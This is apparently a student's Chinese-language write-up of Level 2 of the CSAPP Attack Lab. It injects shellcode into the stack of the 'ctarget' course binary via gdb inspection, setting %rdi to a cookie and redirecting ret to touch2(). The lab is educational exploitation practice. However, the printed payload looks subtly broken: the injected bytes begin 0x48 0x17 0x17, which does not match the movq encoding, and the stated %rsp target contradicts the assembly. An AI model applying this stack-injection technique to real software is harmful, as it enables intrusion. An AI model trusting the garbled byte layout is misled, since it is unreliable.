# Part I: Code Injection Attacks

这一部分的讲义中提到程序设定为运行时栈内存的地址不发生变化，因此通过`gdb`可以查看内存，进行数据和代码的注入。

## Level 2

通过查看内存可以发现，当执行`getbuf()`时，栈顶指针`%rsp`指向的地址为`0x5561dc78`，查看`%rsp -> %rsp + 48`这一段内存：

```bash
(gdb) b *0x4017b4
Breakpoint 5 at 0x4017b4: file buf.c, line 16.
(gdb) r -q
Starting program: /csapp/lab/target1/ctarget -q
Cookie: 0x59b997fa
Type string:asd

Breakpoint 5, getbuf () at buf.c:16
16      in buf.c
(gdb) x /48xb $rsp
0x5561dc78:     0x61    0x73    0x64    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
```

我们函数的返回地址为`0x401976`，可以发现是返回到`test()`函数。为了正确执行`touch2()`函数且确保我们传入的参数和给定的`cookie`值相同（`0x59b997fa`），我们需要将`%rdi`的值设为cookie的值，之后改变返回地址，让程序执行`ret`指令直接跳转到`touch2()`函数中。

由于实验的讲义建议我们不要使用`jmp`或者`call`指令，因此，我们通过修改`ret`的返回地址来进行跳转。

0. 修改内存`0x5561dc78`处的值为`0x4017ec`
1. 修改返回地址执行我们注入的指令执行的地址(`0x5561dc90`)
2. 修改`%rdi`的值为cookie对应的值
3. 修改`%rsp`指向`0x5561dc78`
4. 返回

对应的汇编语句为
```s
# code12.s
movq  $0x59b997fa, %rdi       
movq  $0x5561dc98, %rsp 
retq
```

使用指令编译并进行反编译

```bash
gcc -c code12.s
objdump -d code12.o > code12.d
```

在`code12.d`中即可看到对应的汇编指令。将得到的二进制指令写入到代码注入的内存栈中即可。注入后内存内容如下：

```bash
0x5561dc78:     0xec    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0x17    0x17    0xfa    0x97    0xb9    0x59    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```
